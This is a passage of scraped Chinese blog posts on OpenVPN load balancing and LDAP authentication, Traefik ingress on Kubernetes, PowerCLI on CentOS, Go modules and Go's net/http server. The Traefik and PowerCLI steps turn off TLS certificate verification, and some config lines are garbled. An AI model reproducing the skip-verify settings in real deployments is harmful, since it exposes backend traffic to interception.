与配置文件放置同一个文件夹内。每一组为一个用户。\n连接成功后如图所示：\n","permalink":"https://www.oomkill.com/2019/11/ch2-install-and-configuration/","summary":"","title":"ch2 从零开始安装OpenVPN"},{"content":"方案1：在Vpn 客户端使用多个配置文件实现（由用户选择拨号）类 方案1：需求分析与操作过程讲解。\n基本说明：\n生产场景中比较规范的做法是让所有的VPN SERVER尽可能共享同一套 server，ca证书或者连接同一个认证系统（即使是跨机房）。这样只需要一份客户端认证和文件和多份指定不同vpn client的配置文件即可实现vpn的负载均衡了。\n总结结论：\n1）该负载均衡方案操作简单，不引入多余服务（后面的方案都会引入服务），因此不会增加多余的单点故障，当用户连接的vpn不能使用时，用户就可以人工选择拨号其他的VPN服务器。\n2）如果使用者为公司内部工作人员，此种方案是值得推荐的。老男孩老师推荐。\n3）从广义上讲这是在用户端实现的负载均衡方案，类似早期的华军下载站一样，由用户选择下载站点，而不是用什么智能DNS等复杂的业务模式。\n缺点：当一个vpnserver不能使用时，不能自动连上别的vpn server。\n方案2：通过在客户端配置文件实现负载均衡（客户端文件里随机连接服务器） 提示：同方案1，所有VPN SERVER 需要共享同一套 server，ca证书。openvpn 服务器一套keys的多份拷贝方式式。\nremote 10.0.0.28 52115\rremote 10.0.0.552115\rremote-random\rresolv-retry 20\rimplementing-a-load-balancing-failover-configuration\n总结结论：\n1）该负载均衡方案操作简单，不引入多余服务（后面的方案都会引入服务），因此不会增加多余的单点故障，，当用户连接的vpn不能使用时，电脑可以重新再次自动拨号连接VPN服务器。\n2）如果使用者为公司内部工作人员，此种方案是值得推荐的。-老男孩老师推荐。如果是使用者为外部人员，那么这个方案依然是可以的。\n3）本方案是比较标准的在VPN用户端，由客户端配置参数实现的负载均衡的方案，是非常值得推荐的方案。\n4）和方案1对比，方案2的配置更简单，仅需一个配置文件多个remote参数，拨号时客户端会随机自动选择拨号，方案1则需要手动选择不同的配置文件拨号。当正在连接的VPN服务端右机时，那么此时方案2不需要人工干预，客户端的VPN会自动判断并且自动重新连接其他的可用vpn服务器。.\n方案3：通过域名加DNS轮询的方式实现负载均衡（由DNS自动分配vpn） 总结结论：\n1）通过dns轮询实现VPN负载均衡方案操作比较复杂，引入了DNS服务，因此增加了单点故障及维护成本，当用户连接的vpn不能使用时，用户也需要重新人工再次拨号。\n2）如果使用者为公司内部工作人员，此种方案是不推荐的。如果是外部的用户可以考虑用这种方式，但是复杂度比方案1大了很多（如果存在DNS服务器加配置还可以）。\n3）当机房多，配置文件多时，无需用户选择服务器，只需拨号即可。如果多个VPN在一个机房还好一些，如果多个VPN服务器不在一个机房，还需要通过IPSEC进行连接。 总之，此法很麻烦，中小型公司老男孩老师极不推荐。\n4）DNS轮询会遭遇到客户端DNS缓存问题，从而导致服务切换失效。。\none-network-interface-on-a-public-network\n","permalink":"https://www.oomkill.com/2019/11/ch3-high-availability/","summary":"","title":"ch3 OpenVPN的高可用配置"},{"content":"OpenVPN 2.0与更高版本允许OpenVPN服务器从客户端安全地获取用户名和密码，并将该信息用作认证基础。\n方法1：通过本地证书密钥认证。 默认不配置，openvpn即使用证书进行身份认证。\n（1）编辑主服务器配置文件/etc/openldap/slapd.conf，取消如下行的注释：\n方法2：本地文件认证 在使用身份验证时，需要将 auth-user-pass 指令添加到客户端配置文件中，设置后OpenVPN客户端向用户索要用户名/密码，并将其通过安全的TLS通道传递给服务器进行验证。\n服务端配置文件需要增加配置指令 auth-user-pass-verify auth-pam.pl via-file 使用脚本插件。auth-pam.pl 在源码包 sample/sample-script 路径下。\nplugin /usr/share/openvpn/plugin/lib/openvpn-auth-pam.so login\r生产环境下官方推荐使用 openvpn-auth-pam 插件进行验证，相比于 auth-pam.pl，openvpn-auth-pam 插件具有多个优点：\nopenvpn-auth-pam 使用拆分权限执行模型来提高安全性。 C编译的插件比脚本运行速度更快。 OpenVPN可以通过虚拟内存（而不是通过文件或环境）将用户名/密码传递给插件，这对于服务器上的本地安全性更好。 获取openvpn-auth-pam插件 openvpn-auth-pam插件在openvpn代码目录src/plugins/auth-pam 下，运行 make \u0026amp;\u0026amp; make install 进行安装，会自动复制到openvpn安装好的 lib/openvpn/plugins 目录下。\n开启密码认证 默认情况下， 在服务器上使用 auth-user-pass-verify 或用户名/密码 插件 将启用双重身份验证，要求客户端证书和用户名/密码身份验证都必须成功，才能对客户端进行身份验证。可以选择关闭客户端证书认证。\nclient-cert-not-required\rusername-as-common-name # 用户名作为通用名称\r开启后需要在客户端注释 cert 和 key的配置\nReference\nauthentication methods\n方法3：数据库认证 法2：利用的脚本程序（shell，php等）本地文件去读数据库。\n法1：用pam_mysql\n方法:4：ldap统一用户认证 openvpn-auth-ldap 利用第一个文件认证的思路，去LDAP查询，还可以和本地文件比较。如 ldap认证原理图\r配置openvpn服务端通过ldap进行身份验证 配置OpenVPN基 LDAP的身份验证，需要安装用于LDAP身份验证的OpenVPN插件。openvpn-auth-ldap，它通过LDAP为OpenVPN实现身份认证。\nCentOS中 openvpn-auth-ldap 插件在EPEL中 ubuntu与Centos都可以通过对应的包管理工具进行插件安装。\n安装完成后配置 OpenVPN LDAP身份验证 examples/auth-ldap.conf\n\u0026lt;LDAP\u0026gt;\rURL\tldaps://ip\rBindDN\tdc=kifarunix-demo,dc=com\rPassword\tP@ssW0rd\rTimeout\t15\rTLSEnable\tyes|no\rFollowReferrals no\r\u0026lt;/LDAP\u0026gt;\r\u0026lt;Authorization\u0026gt;\r# 搜索的域\rBaseDN\t\u0026quot;ou=people,dc=ldapmaster,dc=kifarunix-demo,dc=com\u0026quot;\r# 搜索的条件，这里使用的UID，如其他名称为用户名可以选择其他\rSearchFilter\t\u0026quot;(uid=%u)\u0026quot;\rRequireGroup\tfalse\r\u0026lt;/Authorization\u0026gt;\r还可以基于组管理\n\u0026lt;LDAP\u0026gt;\rURL\tldaps://ip\rBindDN\tdc=kifarunix-demo,dc=com\rPassword\tP@ssW0rd\rTimeout\t15\rTLSEnable\tyes|no\rFollowReferrals no\r\u0026lt;/LDAP\u0026gt;\r\u0026lt;Authorization\u0026gt;\rBaseDN\t\u0026quot;ou=people,dc=ldapmaster,dc=kifarunix-demo,dc=com\u0026quot;\rSearchFilter\t\u0026quot;(uid=%u)\u0026quot;\rRequireGroup\ttrue # 这里设置为true\r\u0026lt;Group\u0026gt;\rBaseDN\t\u0026quot;cn=admin,dc=kifarunix-demo,dc=com\u0026quot;\rSearchFilter\t\u0026quot;memberOf=ou=people,dc=seal,dc=com\u0026quot;\rMemberAttribute\tuniqueMember # 需要ldap安装memberof，这时memeberof组的属性\r\u0026lt;/Group\u0026gt;\r\u0026lt;/Authorization\u0026gt;\r修改openvpn配置\nplugin /usr/lib64/openvpn/plugin/lib/openvpn-auth-ldap.so \u0026quot;/etc/openvpn/auth/ldap.conf\u0026quot;\rverify-client-cert none\r完整的服务端配置\nlocal 10.0.0.4\rport 1194\rproto udp\rdev tun\rca ca.crt\rcert server.crt\rkey server.key\rdh dh2048.pem\rtls-auth ta.key 0\rserver 192.168.100.128 255.255.255.128\rifconfig-pool-persist ipp.txt\rpush \u0026quot;route 192.168.100.0 255.255.255.0\u0026quot;\rclient-to-client\rduplicate-cn\rkeepalive 10 120\rmax-clients 100\rpersist-key\rpersist-tun\rlog-append /var/log/openvpn.log\rverb 3\rcompress lz4-v2\rmute 20\rexplicit-exit-notify 1\rreneg-sec 360\rplugin /usr/lib64/openvpn/plugin/lib/openvpn-auth-ldap.so \u0026quot;/etc/openvpn/auth/ldap.conf\u0026quot;\rverify-client-cert none\r启动客户端配置 auth-user-pass\rremote-cert-tls server\r完整的客户端配置\nclient\rdev tun\rproto udp\rremote 10.0.0.4 1194\rnobind\rresolv-retry infinite\rpersist-key\rpersist-tun\rmute-replay-warnings\rcipher AES-256-CBC\r#comp-lzo\rverb 3\rca ca.crt\rtls-auth ta.key 1\rcompress lz4-v2\r#cert client.crt\r#key client.key auth-user-pass\rremote-cert-tls server\r服务端报错 TLS Error: reading acknowledgement record from packet\nTLS: Initial packet from [AF_INET]10.0.0.1:56531, sid=50a1c0bb 07a548a5\rTLS Error: reading acknowledgement record from packet\r原因，客户端开启了安全配置tls-auth ta.key 1 而 服务端没有对应配置\nReference\nauth error\nhow to configure\nopenldap howto\n方法5：配置配置RADIUS认证。 RADIUS (Remote Authentication Dial In User Service)，远程用户拨号认证系统由RFC2865，RFC2866定义，是目前应用最广泛的AAA协议。可实现验证、授权、记账等服务的协议。\n方法6：结合google authtication等设备进行双重认证 ","permalink":"https://www.oomkill.com/2019/11/ch4-authentication/","summary":"","title":"ch4 OpenVPN的统一身份认证方案及实现方法"},{"content":"Kubernetes Ingress Kubernetes Ingress是路由规则的集合，这些规则控制外部用户如何访问Kubernetes集群中运行的服务。\n在Kubernetes中，有三种方式可以使内部Pod公开访问。\nNodePort：使用Kubernetes Pod的NodePort，将Pod内应用程序公开到每个节点上的端口上。 Service LoadBalancer：使用Kubernetes Service，改功能会创建一个外部负载均衡器，使流量转向集群中的Kubernetes Pod。 Ingress Controller： Node Port是在Kubernetes集群中每个节点（Node）上开放端口，Kubernetes直接将流量转向集群中Pod。Kubernetes集群中使用NodePort，则需要编辑防火墙规则，但是NodePort是范围在Kubernetes集群中默认设置的范围为 30000–32767，最终导致流量端口暴露在非标准端口之上。\nLoadBalancer一般应用于云厂商提供的Kubernetes服务，如果自行在机器上部署Kubernetes集群，则需要自行配置LoadBalancer的实现，\nKubernetes Ingress，为Kubernetes中的抽象概念，实现为第三方代理实现，这种三方实现集合统称为Ingress Controller。Ingress Controller负责引入外部流量并将流量处理并转向对应的服务。\nKubernetes IngressController功能实现 上面只是说道，在Kubernetes集群中，如何将外部流量引入到Kubernetes集群服务中。\n负载均衡 无论在Kubernetes集群中，无论采用什么方式进行流量引入，都需要在外部负载均衡完成，而后负载均衡将流量引入Kubernetes集群入口或内部中，\n通常情况下，NodePort方式管理繁琐，一般不用于生产环境。\n服务的Ingress选择 Kubernetes Ingress是选择正确的方法来管理引入外部流量到服务内部。一般选择也是具有多样性的。\nNginx Ingress Controller，Kubernetes默认推荐的Ingress，弊端①最终配置加载依赖config reload，②定制化开发较难，配置基本来源于config file。 Envoy \u0026amp; traefik api网关，支持tcp/udp/grpc/ws等多协议，支持流量控制，可观测性，多配置提供者。 云厂商提供的Ingress。AWS ALB，GCP GLBG/GCE，Azure AGIC Traefik介绍 traefik-现代反向代理，也可称为现代边缘路由；traefik原声兼容主流集群，Kubernetes，Docker，AWS等。官方的定位traefik是一个让开发人员将时间花费在系统研发与部署功能上，而非配置和维护。并且traefik官方也提供自己的服务网格解决方案\n作为一个 modern edge router ，traefik拥有与envoy相似的特性\n基于go语言研发，目的是为了简化开发人员的配置和维护 tcp/udp支持 http L7支持 GRPC支持 服务发现和动态配置 front/ edge prory支持 可观测性 流量管理 \u0026hellip; traefik 术语 要了解trafik，首先需要先了解一下 有关trafik中的一些术语。\nEntryPoints 入口点，是可以被下游客户端连接的命名网络位置，类似于envoy 的listener和nginx的listen services 服务，负载均衡，上游主机接收来自traefik的连接和请求并返回响应。 类似于nginx upstream envoy的clusters Providers 提供者，提供配置文件的后端，如file，kubernetes，consul，redis，etcd等，可使traefik自动更新 routers 路由器，承上启下，分析请求，将下游主机的请求处理转入到services middlewares: 中间件，在将下游主机的请求转入到services时进行的流量调整 在Kubernetes中使用traefik网关作为Ingress Traefik于2019年9月发布2.0 GA版，增加了很多新特性，包括IngressRoute Kubernetes CRD，TCP，最新版增加UDP等。\n安装traefik Traefik 支持两种方式创建路由规则，一是Traefik 自定义 Kubernetes CRD ，还有一种是 Kubernetes Ingress。这里使用 Kubernetes CRD\n官方完整的部署清单资源见附录3 [3]\n创建traefik使用的Kubernetes CRD 资源 traefik官网提供了创建时所需要的 yaml文件，这里仅需要使用官网提供的Definitions与RBAC即可。\n在官网提供的yaml文件缺少 ServiceAccount，需要自行创建。\napiVersion: v1\rkind: ServiceAccount\rmetadata:\rnamespace: default\rname: traefik-ingress-controller\r创建控制器 官方文件中，暂未找到所需运行traefik的控制器，需要自己创建一个。\ntraefik配置一般分为静态和动态配置，此处的静态是指，大部分时间内，不改变的配置（如nginx.conf），动态配置指，经常情况下改变的配置（可以理解为 nginx中 virtual host的每个独立配置文件）。\ntraefik提供配置的提供者也有很多种，此处使用命令行方式设置不长改变静态配置，也可以使用配置文件方式进行配置提供。\napiVersion: v1\rkind: Service\rmetadata:\rname: traefik\rspec:\rselector:\rapp: traefik-ingress\rtype: NodePort\rports:\r- name: web\rport: 80\rtargetPort: 80\r- name: ssl\rport: 443\rtargetPort: 443\r- name: dashboard\rport: 8080\rtargetPort: 8080\r---\rapiVersion: apps/v1\rkind: Deployment\rmetadata:\rname: traefik-ingress-controller-deployment\rlabels:\rapp: traefik-ingress\rspec:\rreplicas: 1\rselector:\rmatchLabels:\rapp: traefik-ingress\rstrategy:\rtype: RollingUpdate\rrollingUpdate:\rmaxUnavailable: 1\rtemplate:\rmetadata:\rname: traefik-ingress\rlabels:\rapp: traefik-ingress\rspec:\rserviceAccountName: traefik-ingress-controller\rvolumes:\r- name: ssl\rhostPath:\rpath: /etc/kubernetes/pki\rtype: DirectoryOrCreate\rcontainers:\r- image: traefik:v2.3.3\rname: traefik-ingress-lb\rimagePullPolicy: IfNotPresent\rvolumeMounts:\r- name: ssl\rmountPath: /usr/local/pki\rports:\r- name: web\rcontainerPort: 80\rhostPort: 1880\r- name: ssl\rcontainerPort: 443\rhostPort: 18443\rsecurityContext:\rcapabilities:\rdrop:\r- ALL\radd:\r- NET_BIND_SERVICE\rargs:\r- --entrypoints.web.address=:80\r- --entrypoints.ssl.address=:443\r- --providers.kubernetescrd\r- --providers.kubernetesingress\r- --api=true\r- --ping=true\r- --api.dashboard=true\r- --serverstransport.insecureskipverify=true\r- --serverstransport.rootcas=/usr/local/pki/ca.crt\r- --accesslog\rlivenessProbe:\rhttpGet:\rpath: /ping\rport: 8080\rfailureThreshold: 3\rinitialDelaySeconds: 10\rperiodSeconds: 10\rsuccessThreshold: 1\rtimeoutSeconds: 5\rreadinessProbe:\rhttpGet:\rpath: /ping\rport: 8080\rfailureThreshold: 3\rinitialDelaySeconds: 10\rperiodSeconds: 10\rsuccessThreshold: 1\rtimeoutSeconds: 5\r配置文件方式，仅需参考官网，把\u0026ndash;agrs中的参数转换为配置文件并引入到pod后。替换启动参数\nargs:\r- --configfile=/config/traefik.yaml\r使用CRD配置Traefik的流量管理 官网提供的基于Kubernetes CRD方式配置不是很多，可以参考动态配置中Kubernetes CRD Resources小结。\n基于traefik dashboard方式配置增加HTTP router 前面使用官方提供CRD文件注册了Kubernetes CRD资源，所以traefik 中的资源类型，可作为kubernetes中资源使用。如 kubectl get Middleware dashboard是traefik自己提供的服务所需的services为自己，traefik的entryPoints，当开启--api.dashboard=true 会增加一个8080端口作为traefik dashboard使用。而 api@internal 是traefik自己提供的services资源。\napiVersion: traefik.containo.us/v1alpha1\rkind: IngressRoute\rmetadata:\rname: traefik-dashboard-route\rspec:\rentryPoints:\r- traefik\rroutes:\r- match: Host(`10.0.0.5`)\rkind: Rule\rservices:\r- name: api@internal\rport: 8080\rkind: TraefikService\r为Kubernetes dashboard增加HTTP路由 基于kubernetes crd作为提供者运行的traefik中，后端service可以是traefik的services也可以是kubernetes资源中的service。\n基于kubernetes sevices\napiVersion: traefik.containo.us/v1alpha1\rkind: IngressRoute\rmetadata:\rname: kubernetes-dashboard-route\rnamespace: kubernetes-dashboard\rannotations:\rtraefik.ingress.kubernetes.io/ssl-redirect: \u0026quot;true\u0026quot;\rspec:\rentryPoints:\r- ssl\rtls:\rsecretName: k8s-ca\rroutes:\r- match: PathPrefix(`/ui`)\rkind: Rule\rmiddlewares:\r- name: strip-ui\rservices:\r- name: kubernetes-dashboard # kubernetes中的service对应的名称\rkind: Service # kubernetes中的service\rport: 443\rnamespace: kubernetes-dashboard # kubernetes中的service对应的名称空间。\r---\rapiVersion: traefik.containo.us/v1alpha1\rkind: Middleware\rmetadata:\rname: strip-ui\rnamespace: kubernetes-dashboard\rspec:\rstripPrefix:\rprefixes:\r- \u0026quot;/ui\u0026quot;\r- \u0026quot;/ui/\u0026quot;\r此处使用了TLS的，开启了TLS，默认traefik是进行双向认证的，而kubernetes的dashboard的证书的ca并不知道，在访问时会出现Internal Server Error，目前没有找到有效的双向认证方法，普遍使用的方法都是调过认证--serverstransport.insecureskipverify=true\n负载均衡 负载均衡使用到的是traefik的services部分。\napiVersion: traefik.containo.us/v1alpha1\rkind: TraefikService\rmetadata:\rname: LoadBalancer\rspec:\rweighted:\rservices:\r- name: prod-v1.2\rport: 443\rweight: 1\rkind: Service\r- name: prod-v1\rport: 443\rweight: 2\rkind: Service\r---\r流量镜像 apiVersion: traefik.containo.us/v1alpha1\rkind: TraefikService\rmetadata:\rname: mirror1\rspec:\rmirroring:\rname: s1\rport: 80\rmirrors:\r- name: s3\rpercent: 20\rport: 80\r- name: mirror2\rkind: TraefikService\rpercent: 20\rReference [1] Internal Server Error with Traefik HTTPS backend on port 443\n[2] IngressRoute subset not found for kube-system/kubernetes-dashboard #6821\n[3] Traefik \u0026amp; CRD \u0026amp; Let\u0026rsquo;s Encrypt\n","permalink":"https://www.oomkill.com/2019/10/traefik-ingresscontroller/","summary":"","title":"kubernetes应用 - Traefik Ingress Controller"},{"content":"poershell github\n本次采用github下载对应的rpm进行安装\nwindows下安装方法\n离线安装包下载地址\nyum install -y https://github.com/PowerShell/PowerShell/releases/download/v7.0.0/powershell-lts-7.0.0-1.rhel.7.x86_64.rpm 安装完成后再终端输入以下命令 pwsh。在一个PowerShell会话，您可以通过运行以下命令来检查的PowerShell的版本。\nPS /root\u0026gt; $PSVersionTable.PSVersion Major Minor Patch PreReleaseLabel BuildLabel ----- ----- ----- --------------- ---------- 7 0 0 Set-PSRepository -Name \u0026quot;PSGallery\u0026quot; -InstallationPolicy \u0026quot;Trusted\u0026quot; 接下来，运行以下命令来安装VMware.PowerCLI模块。这将发现和在PSGallery安装最新版本的模块\nFind-Module \u0026quot;VMware.PowerCLI\u0026quot; | Install-Module -Scope \u0026quot;CurrentUser\u0026quot; -AllowClobber 完成后，通过运行以下命令进行检查，以确保该模块安装。\nGet-Module \u0026quot;VMware.PowerCLI\u0026quot; -ListAvailable | FT -Autosize PS /root\u0026gt; Get-Module \u0026quot;VMware.PowerCLI\u0026quot; -ListAvailable | FT -Autosize Directory: /root/.local/share/powershell/Modules ModuleType Version PreRelease Name PSEdition ExportedCommands ---------- ------- ---------- ---- --------- ---------------- Manifest 12.0.0.15947286 VMware.PowerCLI Desk 如果你想看到所有的VMware安装的模块，运行以下命令。\nPS /root\u0026gt; Get-Module \u0026quot;VMware.*\u0026quot; -ListAvailable | FT -Autosize Directory: /root/.local/share/powershell/Modules ModuleType Version PreRelease Name PSEdition ExportedCommands ---------- ------- ---------- ---- --------- ---------------- Script 12.0.0.15947289 VMware.CloudServices Desk {Connect-Vcs, Get-VcsOrganizationRole, Get-VcsService, Get-VcsServiceRole… Script 7.0.0.15902843 VMware.DeployAutomation Desk {Add-DeployRule, Add-ProxyServer, Add-ScriptBundle, Copy-DeployRule…} Script 7.0.0.15902843 VMware.ImageBuilder Desk {Add-EsxSoftwareDepot, Add-EsxSoftwarePackage, Compare-EsxImageProfile, E… Manifest 12.0.0.15947286 VMware.PowerCLI Desk Script 7.0.0.15939650 VMware.Vim Desk Script 12.0.0.15939657 VMware.VimAutomation.Cis.Core Desk {Connect-CisServer, Disconnect-CisServer, Get-CisService} Script 12.0.0.15940183 VMware.VimAutomation.Cloud Desk {Add-CIDatastore, Connect-CIServer, Disconnect-CIServer, Get-Catalog…} Script 12.0.0.15939652 VMware.VimAutomation.Common Desk {Get-Task, New-OAuthSecurityContext, Stop-Task, Wait-Task} Script 12.0.0.15939655 VMware.VimAutomation.Core Desk {Add-PassthroughDevice, Add-VirtualSwitchPhysicalNetworkAdapter, Add-VMHo… Script 12.0.0.15939647 VMware.VimAutomation.Hcx Desk {Connect-HCXServer, Disconnect-HCXServer, Get-HCXAppliance, Get-HCXComput… Script 7.12.0.15718406 VMware.VimAutomation.HorizonView Desk {Connect-HVServer, Disconnect-HVServer} Script 12.0.0.15939670 VMware.VimAutomation.License Desk Get-LicenseDataManager Script 12.0.0.15939671 VMware.VimAutomation.Nsxt Desk {Connect-NsxtServer, Disconnect-NsxtServer, Get-NsxtPolicyService, Get-Ns… Script 12.0.0.15939651 VMware.VimAutomation.Sdk Desk {Get-ErrorReport, Get-PSVersion, Get-InstallPath} Script 12.0.0.15939672 VMware.VimAutomation.Security Desk {Add-AttestationServiceInfo, Add-KeyProviderServiceInfo, Add-TrustAuthori… Script 11.5.0.14899557 VMware.VimAutomation.Srm Desk {Connect-SrmServer, Disconnect-SrmServer} Script 12.0.0.15939648 VMware.VimAutomation.Storage Desk {Add-EntityDefaultKeyProvider, Add-KeyManagementServer, Add-VsanFileServi… Script 1.3.0.0 VMware.VimAutomation.StorageUtility Desk Update-VmfsDatastore Script 12.0.0.15940185 VMware.VimAutomation.Vds Desk {Add-VDSwitchPhysicalNetworkAdapter, Add-VDSwitchVMHost, Export-VDPortGro… Script 12.0.0.15947287 VMware.VimAutomation.Vmc Desk {Add-VmcSddcHost, Connect-Vmc, Disconnect-Vmc, Get-AwsAccount…} Script 12.0.0.15940184 VMware.VimAutomation.vROps Desk {Connect-OMServer, Disconnect-OMServer, Get-OMAlert, Get-OMAlertDefinitio… Script 12.0.0.15947288 VMware.VimAutomation.WorkloadManagement Desk {Get-WMNamespace, Get-WMNamespacePermission, Get-WMNamespaceStoragePolicy… Script 6.5.1.7862888 VMware.VumAutomation Desk {Add-EntityBaseline, Copy-Patch, Get-Baseline, Get-Compliance…} 当VMware.PowerCLI发布新版本，你可以运行下面的命令来更新。\nUpdate-Module \u0026quot;VMware.PowerCLI\u0026quot; VMware.PowerCLI现在已安装完成，可以连接到您的vCenter Server或ESXi主机\nPS /root\u0026gt; Set-PowerCLIConfiguration -InvalidCertificateAction \u0026quot;Ignore\u0026quot; Perform operation? Performing operation 'Update PowerCLI configuration.'? [Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is \u0026quot;Y\u0026quot;): Y Scope ProxyPolicy DefaultVIServerMode InvalidCertificateAction DisplayDeprecationWarnings WebOperationTimeout Seconds ----- ----------- ------------------- ------------------------ -------------------------- ------------------- Session UseSystemProxy Multiple Ignore True 300 User Ignore AllUsers ","permalink":"https://www.oomkill.com/2019/10/centos-install-powershellpowercli/","summary":"","title":"centos安装powershell和powercli"},{"content":"自从Go官方推出 1.11 之后，增加新的依赖管理模块并且更加易于管理项目中所需要的模块。模块是存储在文件树中的 Go 包的集合，其根目录中包含 go.mod 文件。 go.mod 文件定义了模块的模块路径，它也是用于根目录的导入路径，以及它的依赖性要求。每个依赖性要求都被写为模块路径和特定语义版本。\n从 Go 1.11 开始，Go 允许在 $GOPATH/src 外的任何目录下使用 go.mod 创建项目。在 $GOPATH/src 中，为了兼容性，Go 命令仍然在旧的 GOPATH 模式下运行。从 ==Go 1.13== 开始，模块模式将成为默认模式。\n使用模块开发 Go 代码时出现的一系列常见操作：\n创建一个新模块。 添加依赖项。 升级依赖项。 删除未使用的依赖项。 要使用go module,首先要设置 ==GO111MODULE=on== ,如果没设置，执行命令的时候会有提示。\n==GO111MODULE== 的取值为 off, on, or auto (默认值，因此前面例子里需要注意2个重点)。\noff: GOPATH mode，查找vendor和GOPATH目录 on：module-aware mode，使用 go module，忽略GOPATH目录 auto：如果当前目录不在$GOPATH 并且 当前目录（或者父目录）下有go.mod文件，则使用GO111MODULE， 否则仍旧使用 GOPATH mode。 export GO111MODULE=on\rexport GOPROXY=https://goproxy.io ## 设置代理\rgo mod 参数说明 commond 说明 download download modules to local cache (下载依赖的module到本地cache)) edit edit go.mod from tools or scripts (编辑go.mod文件) graph print module requirement graph (打印模块依赖图)) init initialize new module in current directory (再当前文件夹下初始化一个新的module, 创建go.mod文件)) tidy add missing and remove unused modules (增加丢失的module，去掉未用的module) vendor make vendored copy of dependencies (将依赖复制到vendor下) verify verify dependencies have expected content (校验依赖) why explain why packages or modules are needed (解释为什么需要依赖) 新的项目 可以在GOPATH之外创建新的项目。\n使用空目录创建go.mod (module)\ngo mod init {packagename}\rgo mod init test\rgo get 升级 运行 go get -u 将会升级到最新的次要版本或者修订版本(x.y.z, z是修订版本号， y是次要版本号) 运行 go get -u=patch 将会升级到最新的修订版本 运行 go get package@version 将会升级到指定的版本号version 运行go get如果有版本的更改，那么go.mod文件也会更改 包管理 当我们使用go build，go test以及go list时，go会自动得更新go.mod文件，将依赖关系写入其中。\n下载的包保存在$GOPATH/\n升级依赖项 查看使用到的依赖列表 go list -m all\nroot@lc-virtual-machine:~# go list -m all\rchat\rgithub.com/Knetic/govaluate v3.0.0+incompatible\rgithub.com/OwnLocal/goes v1.0.0\rgithub.com/astaxie/beego v1.12.0\rgithub.com/beego/goyaml2 v0.0.0-20130207012346-5545475820dd\rgithub.com/beego/x2j v0.0.0-20131220205130-a0352aadc542\rgithub.com/bradfitz/gomemcache v0.0.0-20180710155616-bc664df96737\rgithub.com/casbin/casbin v1.7.0\rgithub.com/cloudflare/golz4 v0.0.0-20150217214814-ef862a3cdc58\rgithub.com/couchbase/go-couchbase v0.0.0-20181122212707-3e9b6e1258bb\rgithub.com/couchbase/gomemcached v0.0.0-20181122193126-5125a94a666c\rgithub.com/couchbase/goutils v0.0.0-20180530154633-e865a1461c8a\rgithub.com/cupcake/rdb v0.0.0-20161107195141-43ba34106c76\rgithub.com/edsrzf/mmap-go v0.0.0-20170320065105-0bce6a688712\rgithub.com/elazarl/go-bindata-assetfs v1.0.0\rgithub.com/garyburd/redigo v1.6.0\rgithub.com/go-redis/redis v6.14.2+incompatible\rgithub.com/go-sql-driver/mysql v1.4.1\rgithub.com/gogo/protobuf v1.1.1\rgithub.com/golang/snappy v0.0.0-20180518054509-2e65f85255db\rgithub.com/gomodule/redigo v2.0.0+incompatible\rgithub.com/lib/pq v1.0.0\rgithub.com/mattn/go-sqlite3 v1.10.0\rgithub.com/pelletier/go-toml v1.2.0\rgithub.com/pkg/errors v0.8.0\rgithub.com/shiena/ansicolor v0.0.0-20151119151921-a422bbe96644\rgithub.com/siddontang/go v0.0.0-20180604090527-bdc77568d726\rgithub.com/siddontang/ledisdb v0.0.0-20181029004158-becf5f38d373\rgithub.com/siddontang/rdb v0.0.0-20150307021120-fc89ed2e418d\rgithub.com/ssdb/gossdb v0.0.0-20180723034631-88f6b59b84ec\rgithub.com/syndtr/goleveldb v0.0.0-20181127023241-353a9fca669c\rgithub.com/wendal/errors v0.0.0-20130201093226-f66c77a7882b\rgolang.org/x/crypto v0.0.0-20181127143415-eb0de9b17e85\rgolang.org/x/net v0.0.0-20181114220301-adae6a3d119a\rgopkg.in/check.v1 v0.0.0-20161208181325-20d25e280405\rgopkg.in/yaml.v2 v2.2.1\r列出包的历史版本\ngo list -m -versions {package name}\nroot@lc-virtual-machine:~# go list -m -versions github.com/astaxie/beego github.com/astaxie/beego v0.6.0 v0.7.0 v0.8.0 v0.9.0 v1.0.1 v1.2.0 v1.3.0 v1.4.0 v1.4.1 v1.4.2 v1.4.3 v1.5.0 v1.6.0 v1.6.1 v1.7.0 v1.7.1 v1.7.2 v1.8.0 v1.8.1 v1.8.2 v1.8.3 v1.9.0 v1.9.2 v1.10.0 v1.10.1 v1.11.0 v1.11.1 v1.12.0\r手动处理依赖关系\ngo mod tidy 会自动清理掉不需要的依赖项，同时可以将依赖项更新到当前版本。\n切换包的版本\ngo mod edit -require=\u0026quot;github.com/astaxie/beego@v1.9.0\u0026quot;\r清楚缓存\ngo clean -modcache\rgo mod replace 不过因为某些未知原因，并不是所有的包都能直接用go get获取到，这时我们就需要使用go modules的replace功能了。（当然大部分问题挂个梯子就能解决，但是我们也可以有其它选项）\nreplace (\rgithub.com/testcontainers/testcontainers-go =\u0026gt; github.com/testcontainers/testcontainers-go v0.0.9\rgolang.org/x/lint =\u0026gt; github.com/golang/lint latest\r)\r修改后悔自动生成\nreplace (\rgithub.com/testcontainers/testcontainers-go =\u0026gt; github.com/testcontainers/testcontainers-go v0.0.9\rgolang.org/x/lint =\u0026gt; github.com/golang/lint v0.0.0-20191125180803-fdd1cda4f05f\r)\r","permalink":"https://www.oomkill.com/2019/10/go-mod/","summary":"","title":"Go mod"},{"content":"Go语言标准库内建提供了net/http包，涵盖了HTTP客户端和服务端的具体实现。使用net/http包，我们可以很方便地编写HTTP客户端或服务端的程序。\nhttp服务端的创建流程 在使用http/net包创建服务端只需要两个步骤 绑定处理器函数 func(ResponseWriter, *Request)与 启用监听 http.ListenAndServe。\npackage main import \u0026quot;net/http\u0026quot; func main() { http.HandleFunc(\u0026quot;/\u0026quot;, func(w http.ResponseWriter, r *http.Request) { w.Write([]byte(\u0026quot;123\u0026quot;)) }) http.ListenAndServe(\u0026quot;:8080\u0026quot;, nil) } 通过分析net/http包中server.go 在执行创建http服务端主要执行了下面几个步骤：\nhttp.HandleFunc 绑定处理函数 所有的操作的方法都属于一个结构体 ServeMux m: 用户传入的路由和处理方法的映射表，路由和处理函数被定义为结构体muxEntry的属性 mu： 实例化出来的对象的读写锁 调用DefaultServeMux.Handle() 在DefaultServeMux.Handle()中调用DefaultServeMux.HandleFunc(pattern, handler) 在将传入http.HandleFunc()的回调函数，与路由的映射信息，放到该DefaultServeMux的属性中 映射map中 muxEntry http.ListenAndServe 启动服务监听 实例化一个server结构体 调用 ListenAndServe() ListenAndServe()中 net.Listen(\u0026quot;tcp\u0026quot;, addr) 启动tcp服务监听 Serve()中 appcet()处理用户连接，go c.serve(connCtx) 处理业务段（如判断信息，拼接http、找到对应处理函数） 